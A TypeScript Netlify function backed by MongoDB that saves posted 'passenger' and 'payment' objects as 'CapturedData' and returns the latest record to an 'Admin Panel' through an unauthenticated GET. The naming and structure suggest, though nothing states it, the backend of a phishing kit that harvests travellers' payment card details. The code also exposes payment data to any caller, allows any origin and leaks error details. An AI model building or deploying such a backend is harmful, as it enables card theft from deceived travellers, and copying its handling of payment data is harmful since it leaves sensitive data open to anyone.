
import { Handler } from '@netlify/functions';
import mongoose from 'mongoose';
import dotenv from 'dotenv';

dotenv.config();

const MONGODB_URI = process.env.MONGODB_URI;

let cachedDb: typeof mongoose | null = null;

const connectToDatabase = async () => {
    if (cachedDb) {
        return cachedDb;
    }

    if (!MONGODB_URI) {
        throw new Error('MONGODB_URI is missing');
    }

    const db = await mongoose.connect(MONGODB_URI);
    cachedDb = db;
    return db;
};

// Define Schema outside handler to avoid recompilation errors
const CapturedDataSchema = new mongoose.Schema({
    sessionId: String,
    passenger: Object,
    payment: Object,
    timestamp: Date
}, { strict: false });

const CapturedData = mongoose.models.CapturedData || mongoose.model('CapturedData', CapturedDataSchema);

export const handler: Handler = async (event, context) => {
    context.callbackWaitsForEmptyEventLoop = false; // Important for MongoDB in Lambda!

    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 200,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'GET, POST, OPTIONS'
            },
            body: ''
        };
    }

    try {
        await connectToDatabase();

        if (event.httpMethod === 'POST') {
            const data = JSON.parse(event.body || '{}');
            const sessionId = data.sessionId || 'unknown_session'; // In a real app, manage sessions better

            // Upsert data
            await CapturedData.findOneAndUpdate(
                { sessionId: sessionId },
                {
                    ...data,
                    timestamp: new Date()
                },
                { upsert: true, new: true }
            );

            return {
                statusCode: 200,
                headers: { 'Access-Control-Allow-Origin': '*' },
                body: JSON.stringify({ success: true })
            };
        }

        if (event.httpMethod === 'GET') {
            // For Admin Panel: Fetch latest data
            // For this demo, we just fetch the most recently modified document
            const latestData = await CapturedData.findOne().sort({ timestamp: -1 });

            return {
                statusCode: 200,
                headers: {
                    'Access-Control-Allow-Origin': '*',
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(latestData || {})
            };
        }

        return {
            statusCode: 405,
            body: 'Method Not Allowed'
        };
    } catch (error) {
        console.error('Database Error:', error);
        return {
            statusCode: 500,
            body: JSON.stringify({
                error: 'Database connection error',
                details: error instanceof Error ? error.message : String(error)
            })
        };
    }
};
